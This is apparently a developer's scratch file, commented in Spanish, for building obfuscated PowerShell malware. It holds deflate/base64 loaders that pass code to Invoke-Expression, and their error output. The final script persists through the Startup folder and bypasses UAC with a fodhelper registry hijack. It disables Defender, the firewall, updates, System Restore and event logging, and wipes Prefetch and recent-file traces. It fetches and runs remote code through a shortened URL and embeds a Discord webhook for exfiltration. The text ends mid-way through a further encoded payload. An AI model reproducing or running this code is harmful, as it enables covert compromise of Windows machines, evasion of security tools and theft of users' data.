(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'eJyVVstqw0AQ/ZdKYbNBqN3aORieciCTiBgK5KFDWoZKRAJt4MWk3fW/O5CQhAUa3Rt77717JL8RPGeTbO7O3L6TRXMEat9mUOnGYoRMfsHHTBAYFaUqzhK5QmEAwTKivjEYwsPrR+TRcKzHZcAw9zMN5PU4GSHZLgsgAibL9Yo2EQXjC9l6mgdmAnDSEEE67tO6BX/NVoTGjQQzBoXQOZKDFHHShCg8CmHGwXZbB8wxTcfTtxht5JDFPp7VSyZLfhVExGQsV52U1aQNoDEmiFbE7bhhFNsCAei7WeVQjaKM+HgZhNrUinb0mguXHppvODq44bQyzFxTXDGZlvwNfBZwG9zo5Z50Rl3PoB8WfGhHdGyRQ6S+ot0/3+t4/cPh56MAydmC6ENmnVfMvoSduYpy5B9ew4GVpGg17U6tYwOZ5sUZKOnT26ebjv3D1eLVNHObaT+eTDwVVW5Stn8nxpSPJtRGg9CWvsa6nDZfCFc+17qENpt06cV+ELmCN24AdV66pkUer/Nk7lK') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION



# Stage 1

# 1. Escribir el texto a comprimir y codificar
$text = "hoOlaMuundo"

# 2. Convertir el texto en bytes
$textBytes = [System.Text.Encoding]::UTF8.GetBytes($text)

# 3. Comprimir los bytes usando DeflateStream
$memoryStream = New-Object System.IO.MemoryStream
$deflateStream = New-Object System.IO.Compression.DeflateStream($memoryStream, [System.IO.Compression.CompressionMode]::Compress)
$deflateStream.Write($textBytes, 0, $textBytes.Length)
$deflateStream.Close()

# 4. Convertir los bytes comprimidos a una cadena Base64
$compressedBytes = $memoryStream.ToArray()
$encodedString = [System.Convert]::ToBase64String($compressedBytes)

# Mostrar la cadena codificada
Write-Output "Cadena Base64 Comprimida: $encodedString"

# 5. Generar el código PowerShell que descomprimirá y decodificará esta cadena
$decompressionCode = @"
(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( '$encodedString') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION
"@

Write-Output "Código PowerShell para descomprimir y decodificar:"
Write-Output $decompressionCode

# Stage 2

# Base64 encoded and compressed string
$encodedString = 'xVrrd6LItv+ev4LlyppOzhltMZqO06vvvUoUMdEYUFDGWTMFlEosHs3DR2b6fz+7CjBq1KTn9Kzrh2hg137+9qOgzs4bQeAFNTOyPbcX4AkOsGti7guXU2yC3YisBc+NbDfGuc9nZ2fnihnYftRD0QxozjtryV14JqKrCx0gdRzkWgV6+/PZeWOFU8ILEUf5XuCZOAy5vGRx5z3p9jKja8aEpIT2hLvYknHJ/clti/zGYRJiejHj/Q3WhxEKothPWbQ9282z3+fYXfxS6/Vua/0alxdmNrHY9Q8d2wy80JtEY812LW8ZjhXKgutgNx6DmtMAOem12B9/oIZPYpf5iOvjMMrXLMd2uT/POPgEOIoDl7vo4mX+wXjCZsQp2IwDO1oXeoHtmraPSCEVtLlw8etxIskCx8Od3375BfwmxAHEJLq4vLwsSKHkyh7Bp1bXY5tECRkwYJraYRSgyAsuP59927aFBm+O8womExn7xE4Cmdp1HqSXsAVe/VVZhxF2CtIDixpwhmAbtosvtt3/8wE6MEEGUHhOEwDVRQ6+uOT+fZiusYqwG4IKFxtMXILOVBsKjLzrRdwFCwCL447oYzw3UrdYXl6mNtKPAtCkGAcfcylutizPq4jEOAHwHtUGtnkZLVM16YfRSqDINqPLQi2KAtuIIxyCOz+0bAui/CFZ9e1oWG7B2CA2t8LC/sjY8RY4EZJok2vdCYNfxgqAeokCPBYICkMcjp0wH+IIEngajsMZJiQH6lLsQBrlm15gYkD3hi+zkubJNmeWRolrZc+LxqxMROYMOIFzIxxwuX/1HrSGrLQa9/f/KviTHPfXroqpIAarkKUzDclBWG2FTLOjmRcfREXKy09VoSuoW/+u/ltKMf1fMLcrYhs3Ey/AyKQonMAtDurBcdrDMWMLC9Qm5o1tLyWoSP5uxQcAZQIC3zY3rXrj15VOZhxohLQZFPusZEFJ/b1wj8JIg6qC+zbVZwq4Z2C+BQQDgC3rFq3DizwP+fNty0VbSr3hoCOU73PPPmxf+Wnjpn+uWLzuT28Z8VIl9tVOe9kOA9ZzNp3S95Y4YFlbwCswvBZMYwcceA8Fncvlux4QMt/m087L/ZF7rcKHjQ4fUiW4/FbX5/Yb/R85yIwELkq0Bu5JrXrl8H39ZeyC69LK92I29EUWv4sf3xp2fLpXRGlZl/GUtr41uMnHQWRD0iTq+gg6PHexUf1XoIIS+du5T5vYy+UZCmcRMqCTQm5nPBJxl2dHoca47MCGzgbboPBfAAGJ+BBH+S4Y9XkbyC/ZM8frtLpkGhTu8Drc72GUf2roelcOcz9jk3azLVa/0uu/cfn+2sfcreYF1gGn7hnJZoqNfecLxhMmxj9yu4D9A3AEc5oZs+HSg0645uprH9EZ8DW+WDXGgOBNgAGIn3eT+tjAmX4zI/Iu5j5QuAQuIkmqftj21ba+r0Vtl5G9qL27xY7Bue7YTHTKHYvzkZj9bSksyrmLWzxBMYkuc5tgJ/YmWvy8Y9iPFX2LCZ5Cp0hCjuF6xp/FRWEpdsgbLx7fLX+5iWeBOGBB0XSkKL0sxis7SgbccwOFGHKEBrl1d98Bmx6afa0mN8YMhoD7152RA89h18IBIAEaFSK0CYIqEWYFJWWXsYY+ikie9ckXGrpyYgd4iTYbmkz+SOk3OuN0lqeVNvAIIGCs4GBhg7VjZQYut2omtXzco/UJA4TDcTPjx/KHbsKOVLa8fyiGrweAVAcVmIPK464X2ZN08gctsjin1IWkFvc9mAwK2Z6j5lodZNNZGMFeEeLyUk64//sz13BpxQRcfOGKMCa8pe73hmezu+IEMAMHuxa80ubWDqk6e0RfOP7bW67coGiXI8NaxrYGLVPx19TVjCn3efe2v9lViTEKmE/4XZIUC+CwpkfAvAQBhwgBHnRfiMgxVhJwisNkI7+gpJ6bhO8Q7UNN3QLuawKK7wjg3fFcG7aOAIpDRDCewx6QrPtoDhS1Y8wUH5uguBy7LpB1PAsfsrCPHHDzYa16g9rujWJ6I02gO4z9GrEXOL337a3gHs7wE6Gu4xla2F5w0iF14pnzGsyRQRgpGB/yhUC82Drp+gc3AcFJIsVE7oObRSnJuYNktAFSYndPYyU2HDtSwOcwjQMKQ7Yt+MKVNs473CLeV87wPHA3nYGV9U1DKtPnKf8t/0691kn/eUvM8eKzU6zHt54DVS0dqY9UtawaJyjjTlaX75ENqrsWZPX/j/RebECZ+nGy34puVu3fbE6NlU9gDg5eQuxAiAHTkFqbNpPGO/cwmeTSQXZn1ni7BbGO+VqphjXF44MSdx20NXO9r+UdkXfECdBEWl4YHYmLho30uVSDDnpoUx/f7G/v773Z98C3YL4b1wavdOl6tTjykvvv667f0fm7/XH6+AZ2H17wGqFZrZOT+rbdWyf29H0Z8d7CEwbhpuzsapGWny9c+buNfxMDG+9kDf0gFu4Hte8L/ZvWLkMzXJj/rKlZmNkzCU7GvhdErFcdjrL1ffg6ZmL6c0yfl0SYq4Uh8Dk4z05qhHjLvifiqAW7kR/sYQ0hpYMt21R+jJ/fFNigo+G999q//4SwbFZv0Tllpvy4zHnbrwpGAXvI+89Bl1amvURVzBm2YgIbrxM7pK17fw/U7yjZt5j6Id0q7Mm/D5EwmTYJmobftUt7K5eA73tk/RhhpwxMyqFqB1GMiP3MmmIddnNWhsdsipHx1xgGmx5B0cQLnOx2E6MoDvCuxvuPsgZuQN/O2CZ7T5SMGuypTsffepOa39pP9Xf2U9w5bNcOLunUesqmDlI9j3Ld329kPGuWtbegsTJJsjncvBpNesltALsm7p1LICS9k6Sb57Rcjj20SXRPszKb4pYximkXhbilL1mTx49pLoC/7cDhZlHkh798/BgYhen64+rZf+It7i/OxisgOF9iY+Z5c/qIJSO07ND0Aqtges5H5NsfU5LwI1+q3FQr/Ce+dPWpUvlUrJSuPurPqixKN2LsPD71leffw9IU95VhN5wXo0b12a/8XrleiXE1LomN1vLp3hnOwlHvviyWxc5IdJ4ehCv6nuh8kSQ+1aNUKBeu6bU+dnz2MPNL+jqGum0MvvYLfsiDT85f3yXpLWzOPO7Tp/hju0GeHzU5Qlp52lPqD/rQjPql9ldd6xalZpeMrtQ1GsqVe1JfI63yhIb1mSFUhvB7blxZz4NW2zecrm+KzfCuGfVhHW86pIiVyiN8x6MSWY60ZayWSKyL1SuzSOa6VilSnsO+dy2X1OIjyDAdNbaEqX/3WLxrN5pzQyOxdFucbukXg9/aBmkvDHHgafzbuj26qm+05HSNaj08+XVd5EFf8my12jNLrK6ZPFH2TbtWlQSJ6laCDS8xhnVTmc8Cw9F5NHi0bx99X7drnqTMBvqwW7xX67B+Os2+JVueo6Fk3ynzKV4W7/qOenU/IEVdK06Tb36Ah3UiNUCWoz5R2VipRQOxWURCzU50kLqCW+wKDnEkYRoZTrUoCXJJH7afkVaN75T6p9tHb7p9jfpIepLirlDmpWnxbsLsWS30dWqPSNZDscpbrTpvCZUiblFbvLnhqGVLlBfGlQRxr9l6iRRRS7Xvne7CUEAPm8mIGH93NLcciFGJLAyb3XuyhnVfF6iM9gCJg2m/0URYqUcjzV+Ydv1qNOxMdYeUIRau1ABMiGRe9gTdXNdt06kGOuDNHKo+5Xuf8AxHQ7/C5JEmj7RuIIntNcQxlkR9gYX6V0vjl7B+QddILdnTlXqyBuzQ12Vmlz6cMnvuwT49sWOW+Mhj90dJnBfUV22xQ2nngKMl0h7jwZVqm1cyxZJ7d9sIO8qcrp8zHIqrGXbnezTS1f1tw2dyFco380ulb2ltijHAmul1nqYZLyfhlfjjnnT5kdst0jzR19NVd71cJXg0T+g1yHh5x/XqrDK90Cm97Eyex+QZYvMa8naX5lnK5AXH5TWWmTxDOCHvuZbxio7zMjOa+DjNxp+LE/4sZTqZJ3TqCqkPWo0TPpeKG14MPwlW9+RVNlgQ1cgolRkOAWNzXZDnbXEw1wGLbVECDMqxPpwVoR5Crsh2gsVmrJfUkGHVlt22OIXYyU5bHM0R+L4tLueGIsdt8YauX0LM5sZa/gp6z9Fa9ilfuO+n676ydWw9XBdgXUuidF5bLFN+IVxn+QA5Dzmb6trSiekUj/BXy0zPlk8MMc0pyA2oa1AT5JnhWATkeJCjM6gR04lQ71nDx2iQ+hDq55D2BV3hJeOqS+vata6t5iPwPdJG0ztBTmqzXYv0YWPa5uW1pQ3cTc2DXmQJfNds1te6RvVUobcMoLZC3Sw1bajviq41Q0skkT4AnUCWccViPG23GK+uAPpLQh3kPEb9YR36k+pAjSPQv4gk8E0sdkNr2PWNUuVxNIT8SuvnS12d+TrUOuiTLR1sU4bQJ5RN7QZd9IUJvJhfAY+6UplZLWp/m7dE9bmnWBLSqM/K1B9tw9UXqDSI1JJqDxx1ZWnqsyXUInXY9qls7KihLjZs0A18KYtIW5GXmg554TRdwxlQLBEWGzvVhawoPmd6qULSOjgdaSvAVpnGLDRKJu1nkA/tMLlfi2RYCz28YojVmd6sfjVL1bg3jMyR0ObNkro2nGakqytaR6dDkcqBfv3k3xolfgm6EXNemRmaCvRSKDWBjvYR2kddmV67ZtfmFWKt64kdTXXJZInqfCQ0TcOeJfEH/ln/h9hT+VXJTvSDfhLqfb6WyIcexwNP8Hu7ZZGRM1sYpXDag9yymK3Sv9tPja5AusXRsA39uhvqmroEX9IZBfAhPwPNMuvrm5lD4Imp1Fy11eZ1xfRpLwfM9Gm8D2CmgYbd2chZEYjfDGYNH3zQBfz4tL+z3ifIDvj+WQf8JDiGtVq1BHlwAMtqeVRa8azPkt25AvSsUlxZWsUDDBGaf3R2ymaMjA50EgH3TzqraWp8BIcPQAN5v6Q4VGgOW84gw/P+TAIzTpvNWibTMcE49z8wVmYTKAyUJmyLYNtCuPyEy1vY9Cy8TQC/k++/OC+O8i59I8v9dGAyPTtLz6Vp2KDbJtj7cPlBYL/M36blFtIZHPl+MoZHETJn9MxK+BFG8GrxU5GvXPPl6lWxelOGwfy6Wi6Xb0qla77E3/DFSplO8ZHnI5duH/4Xr75cXxtF/prHP9kh/EbYLFfxTzPnC4/LVrFYmpg31UnlqoTwtVG5mpSqN4aJzMlNtfSpWJzw+Ia/+jRB/KR8ZaKJiYxK1bCsm0qV/wl2Hw8xO/KTWksH9HEi3k43Ly8HGo7SbJ05ofuizb6W7gtgf0W3R5sDldOXt8Lf95ZWjt30gMK5m5yco4/DqBJoS1BGsjnh8BLEXZV3DlW8Or6S6nnyBEtmy9FDLKeOpWwWJydTmEU7pxXYK6gdt6b7xOQd6QHf7p4BPnFadet03M9c7vtOAmdOJO48lx1BTMDxhds6/ktPY6U/teT9W0GhVJsVsLE344geoE7OyggBRhFW0us7J9Uu9xYV+iiY4uwA9skAv6xR0AJfJId/j0D089kpJ7/k/t5R4d0bW4dV6bu35DzGfwA='

# Decodificar la cadena base64
$decodedBytes = [System.Convert]::FromBase64String($encodedString)

# Crear un MemoryStream con los bytes decodificados
$memoryStream = New-Object System.IO.MemoryStream
$memoryStream.Write($decodedBytes, 0, $decodedBytes.Length)
$memoryStream.Position = 0

# Descomprimir usando DeflateStream
$deflateStream = New-Object System.IO.Compression.DeflateStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)

# Leer el contenido descomprimido usando StreamReader
$streamReader = New-Object System.IO.StreamReader($deflateStream, [System.Text.Encoding]::ASCII)
$decompressedContent = $streamReader.ReadToEnd()

# Definir el comando para ser ejecutado
$scriptBlock = [ScriptBlock]::Create($decompressedContent)

# Ejecutar el comando
& $scriptBlock



Excepción al llamar a "FromBase64String" con los argumentos "1": "Longitud no válida para una matriz o cadena de
caracteres Base-64."
En línea: 5 Carácter: 1
+ $decodedBytes = [System.Convert]::FromBase64String($encodedString)
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : FormatException

Excepción al llamar a "Write" con los argumentos "3": "El búfer no puede ser nulo.
Nombre del parámetro: buffer"
En línea: 9 Carácter: 1
+ $memoryStream.Write($decodedBytes, 0, $decodedBytes.Length)
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : ArgumentNullException










# Base64 encoded and compressed string
$encodedString = 'eJx9VEtv2jAQ/S9jH5mVNiVu5JbSiYAkKdpIDnHpwt4kjWZHlFiR+fi3dmVt7+zsZBLtO57Zfb9d9VR5lBNmR5Ux+DBItvYKv1EYeqBzr1EIu/BeVsRDlvYZbwmzflbrFvQZUMjCWTWRGEcB7EMi6exfBcQtsFAdUGUGpOAW7QK8EBT4NG2iEplvlHkVnIiScBDU1R4BPkmcEk8Gx44/hmyoPmgMzfGkQ/4ueg59XAvAwkcyArUeQwAfmYA8+KSVSTP/ESymCMWZ8k9Vkx1Z0rECxKLSa4ORd7E7XEgbkGFS+PYLDZFOGQuwVNyijLlBlGukLOzG+NGt5HiV0B2cZjHnJrRaQj28Hc92mvd/QPp/hqD8YT1dq75Z55Id0JdppA3H/2v6R/2/+PgEZ8d0A='

try {
    # Decodificar la cadena base64
    $decodedBytes = [System.Convert]::FromBase64String($encodedString)

    # Crear un MemoryStream con los bytes decodificados
    $memoryStream = New-Object System.IO.MemoryStream
    $memoryStream.Write($decodedBytes, 0, $decodedBytes.Length)
    $memoryStream.Position = 0

    # Descomprimir usando DeflateStream
    $deflateStream = New-Object System.IO.Compression.DeflateStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)

    # Leer el contenido descomprimido usando StreamReader
    $streamReader = New-Object System.IO.StreamReader($deflateStream, [System.Text.Encoding]::ASCII)
    $decompressedContent = $streamReader.ReadToEnd()

    # Mostrar el contenido descomprimido
    Write-Output $decompressedContent

    # Definir el comando para ser ejecutado
    $scriptBlock = [ScriptBlock]::Create($decompressedContent)

    # Ejecutar el comando
    & $scriptBlock
}
catch {
    Write-Output "Ocurrió un error: $_"
}





Ocurrió un error: Excepción al llamar a "FromBase64String" con los argumentos "1": "Longitud no válida para una matriz o cadena de caracteres Base-64."






# Base64 encoded and compressed string
$encodedString = 'eJx9VEtv2jAQ/S9jH5mVNiVu5JbSiYAkKdpIDnHpwt4kjWZHlFiR+fi3dmVt7+zsZBLtO57Zfb9d9VR5lBNmR5Ux+DBItvYKv1EYeqBzr1EIu/BeVsRDlvYZbwmzflbrFvQZUMjCWTWRGEcB7EMi6exfBcQtsFAdUGUGpOAW7QK8EBT4NG2iEplvlHkVnIiScBDU1R4BPkmcEk8Gx44/hmyoPmgMzfGkQ/4ueg59XAvAwkcyArUeQwAfmYA8+KSVSTP/ESymCMWZ8k9Vkx1Z0rECxKLSa4ORd7E7XEgbkGFS+PYLDZFOGQuwVNyijLlBlGukLOzG+NGt5HiV0B2cZjHnJrRaQj28Hc92mvd/QPp/hqD8YT1dq75Z55Id0JdppA3H/2v6R/2/+PgEZ8d0A='

try {
    # Asegurarse de que la cadena tenga el padding correcto
    switch ($encodedString.Length % 4) {
        2 { $encodedString += '==' }
        3 { $encodedString += '=' }
    }

    # Decodificar la cadena base64
    $decodedBytes = [System.Convert]::FromBase64String($encodedString)

    # Crear un MemoryStream con los bytes decodificados
    $memoryStream = New-Object System.IO.MemoryStream
    $memoryStream.Write($decodedBytes, 0, $decodedBytes.Length)
    $memoryStream.Position = 0

    # Descomprimir usando DeflateStream
    $deflateStream = New-Object System.IO.Compression.DeflateStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)

    # Leer el contenido descomprimido usando StreamReader
    $streamReader = New-Object System.IO.StreamReader($deflateStream, [System.Text.Encoding]::ASCII)
    $decompressedContent = $streamReader.ReadToEnd()

    # Mostrar el contenido descomprimido
    Write-Output $decompressedContent

    # Definir el comando para ser ejecutado
    $scriptBlock = [ScriptBlock]::Create($decompressedContent)

    # Ejecutar el comando
    & $scriptBlock
}
catch {
    Write-Output "Ocurrió un error: $_"
}


Excepción al llamar a "FromBase64String" con los argumentos "1": "La entrada no es una cadena Base 64 válida porque contiene un carácter que no es Base 64, más de dos caracteres de relleno o un carácter no válido entre los caracteres de relleno. "



# 1. Escribir el texto a comprimir y codificar
$text = @'

$ErrorActionPreference = "SilentlyContinue";


$ScriptPath = $MyInvocation.MyCommand.Path;
$ExePath = (Get-Process -Id $PID).Path;
$FullPath = if ($ScriptPath) { $ScriptPath } else { $ExePath };
$startupPath = Join-Path $env:APPDATA -ChildPath 'Microsoft\Windows\Start Menu\Programs\Startup\';


function Test-Admin {
    return (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);
}


function Invoke-SelfReplication {
    $replicated = [System.IO.Path]::Combine($startupPath, [System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($FullPath));
    if (-not (Test-Path ($startupPath + [System.IO.Path]::GetFileName($FullPath)))) {
        Set-Content -Path $replicated -Value (Get-Content -Path $FullPath -Raw);
        (Get-Item $replicated).Attributes = 'Hidden';
    }
}


function Invoke-SelfDestruction {
    
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force;

    
    Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*POWERSHELL*.pf" | Remove-Item -Force;
    $scriptName = [System.IO.Path]::GetFileNameWithoutExtension($FullPath);
    $prefetchFiles = Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "$scriptName*.pf";
    if ($prefetchFiles) {
        foreach ($file in $prefetchFiles) {
            Remove-Item -Path $file.FullName -Force;
        }
    }


    
    $recentFiles = Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Recent" | Where-Object { $_.LastWriteTime -ge ((Get-Date).AddDays(-1)) };
    if ($recentFiles) {
        foreach ($file in $recentFiles) {
            Remove-Item -Path $file.FullName -Recurse -Force;
        }
    }

    
    if (-not (Test-Path ($startupPath + [System.IO.Path]::GetFileName($FullPath)))) {
        if ($ScriptPath) {
            Remove-Item -Path $FullPath -Force;
        } else {
            Start-Process powershell.exe -ArgumentList "-NoProfile -Command `"Remove-Item -Path '$FullPath' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden;
        }
    } else {
        Rename-Item $FullPath -NewName ([System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($FullPath)) -Force;
    }
}


function Set-RegistryProperties {
    param (
        [string]$path,
        [hashtable]$properties;
    )

    if (-not (Test-Path $path)) {
        New-Item -Path $path -Force | Out-Null;
    }

    foreach ($key in $properties.Keys) {
        Set-ItemProperty -Path $path -Name $key -Value $properties[$key] -Type DWord -Force;
    }
}


if (-not (Test-Admin)) {
    $value = "`"powershell.exe`" -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$FullPath`"";
    
    if ($MyInvocation.MyCommand.CommandType -ne 'ExternalScript') {
        $value = "`"$FullPath`"";
    }

    
    New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null;
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value $value -Force,
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -PropertyType String -Force | Out-Null;

    
    Start-Process "fodhelper.exe" -WindowStyle Hidden;

    
    exit;
}


$baseKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender";
$realTimeProtectionKey = "$baseKey\Real-Time Protection";
$firewallPath = "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy";

Set-RegistryProperties -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -properties @{"Enabled" = 0};
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -properties @{"DisableNotifications" = 1};

Set-RegistryProperties -path $baseKey -properties @{
    "DisableAntiSpyware" = 1 ;
    "DisableApplicationGuard" = 1;
    "DisableControlledFolderAccess" = 1;
    "DisableCredentialGuard" = 1;
    "DisableIntrusionPreventionSystem" = 1;
    "DisableIOAVProtection" = 1;
    "DisableRealtimeMonitoring" = 1;
    "DisableRoutinelyTakingAction" = 1;
    "DisableSpecialRunningModes" = 1;
    "DisableTamperProtection" = 1;
    "PUAProtection" = 0;
    "ServiceKeepAlive" = 0;
}

Set-RegistryProperties -path $realTimeProtectionKey -properties @{
    "DisableBehaviorMonitoring" = 1;
    "DisableBlockAtFirstSeen" = 1;
    "DisableCloudProtection" = 1;
    "DisableOnAccessProtection" = 1;
    "DisableScanOnRealtimeEnable" = 1;
    "DisableScriptScanning" = 1;
    "SubmitSamplesConsent" = 2;
}

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ekrn" -Name "Start" -Value 4;


Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\MBAMService" -Name "Start" -Value 4;


Set-RegistryProperties -path "$firewallPath\DomainProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1};
Set-RegistryProperties -path "$firewallPath\StandardProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1};
Set-RegistryProperties -path "$firewallPath\PublicProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1};

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -Force;
Set-RegistryProperties -path "HKCU:\SOFTWARE\Microsoft\Edge\SmartScreenEnabled" -properties @{"(Default)" = 0};
Set-RegistryProperties -path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -properties @{"EnableWebContentEvaluation" = 0};

Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -properties @{"NoAutoUpdate" = 1};

Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" -properties @{"DisableSR" = 1; "DisableConfig" = 1};
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\srservice" -properties @{"Start" = 4};

Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -properties @{"EnableLUA" = 0};

Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -properties @{"Start" = 4};

Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting" -properties @{"Disabled" = 1};

Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance" -properties @{"fAllowToGetHelp" = 0};

Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" -properties @{"Start" = 4};

Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog" -properties @{"Start" = 4};

Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -properties @{"Start" = 4};

Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -properties @{"Start" = 4};

Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" -properties @{"MaintenanceDisabled" = 1};

Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" -properties @{"LsaCfgFlags" = 0};
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -properties @{"LsaCfgFlags" = 0};

Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -properties @{"EnableVirtualizationBasedSecurity" = 0; "RequirePlatformSecurityFeatures" = 0};

Set-ExecutionPolicy Unrestricted -Force; Set-MpPreference -DisableRealTimeMonitoring $true; Set-MpPreference -MAPSReporting 0; Set-MpPreference -DisableBlockAtFirstSeen $true; Add-MpPreference -ExclusionPath $env:SystemDrive ; Add-MpPreference -ExclusionPath $env:TEMP; Add-MpPreference -ExclusionExtension ".exe"; Set-Service -Name "wuauserv" -StartupType Disabled;

irm https://rb.gy/xzpj1d | iex;

$webhook = "https://discord.com/api/webhooks/1258951712375570523/ZzVRGI8GumQjTSz_s2geTSXNsk0tE9zp5_56xGu9u2GEHwjLmXhsYPL4G4GMYGmjOC3f";
$version = "2.4.6";
$TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo 77u/JElzQWRtaW4gPSBOZXctT2JqZWN0IFNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKQ0KJEFkbWluID0gJElzQWRtaW4uSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKQ0KJGRpciA9ICIkZW52OnRlbXBcSkhrbmZ1aUQiDQppZiAoIShUZXN0LVBhdGggLVBhdGggIiRkaXIiKSkgew0KTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAiJGRpciINCn0NCmlmICgtbm90ICR2ZXJzaW9uKSB7DQogICR2ZXJzaW9uID0gIjIuNC41Ig0KfQ0KJGxvZyA9ICIkZGlyXG91dHB1dC50eHQiDQokbmV4dGRvb3IgPSAiZ2l0aHViLmNvbSINCiR2ZXJtID0gInYkdmVyc2lvbiINCiRjdXBpZCA9ICJUaGUgTEFaeSBtYWpvciB3YXMgZml4aW5nIEN1cGlk4oCZcyBicm9rZW4gcXVpdmVyLiINCiRsYXp5ID0gIlF1aWNrIGJyb3duIGZveCBqdW1wcyBvdmVyIHRoZSBsYXp5IGRvZy4iDQokZXggPSAiLmV4ZSINCiRhID0gIjoiDQokYiA9ICIvIg0KJGMgPSAkY3VwaWQuU3Vic3RyaW5nKDEsMSkNCiRkID0gJGxhenkuU3Vic3RyaW5nKDI3LDEpDQokZSA9ICRjdXBpZC5TdWJzdHJpbmcoMjgsMSkNCiRmID0gJGN1cGlkLlN1YnN0cmluZygxNywxKQ0KJGcgPSAkY3VwaWQuU3Vic3RyaW5nKDUsMSkNCiRoID0gJGxhenkuU3Vic3RyaW5nKDMxLDEpDQokaSA9ICRjdXBpZC5TdWJzdHJpbmcoMiwxKQ0KJGogPSAkbGF6eS5TdWJzdHJpbmcoMzIsMSkNCiRrID0gJGxhenkuU3Vic3RyaW5nKDEwLDEpDQokbCA9ICRjdXBpZC5TdWJzdHJpbmcoMzAsMSkNCiRtID0gJGxhenkuU3Vic3RyaW5nKDcsMSkNCiRuID0gJGxhenkuU3Vic3RyaW5nKDgsMSkNCiRvID0gJGN1cGlkLlN1YnN0cmluZyg2LDEpDQokcCA9ICRjdXBpZC5TdWJzdHJpbmcoNCwxKQ0KJHEgPSAkY3VwaWQuU3Vic3RyaW5nKDI0LDEpDQokciA9ICRsYXp5LlN1YnN0cmluZyg5LDEpDQokZGVtb24gPSAiJGMkZCRkJGUkZiRhJGIkYiRuZXh0ZG9vciRiIg0KJGFuZ2VsID0gIiRnJGgkaSRmJGYkaiRrJGwkbSRuJG8kYiRwJGokbyRq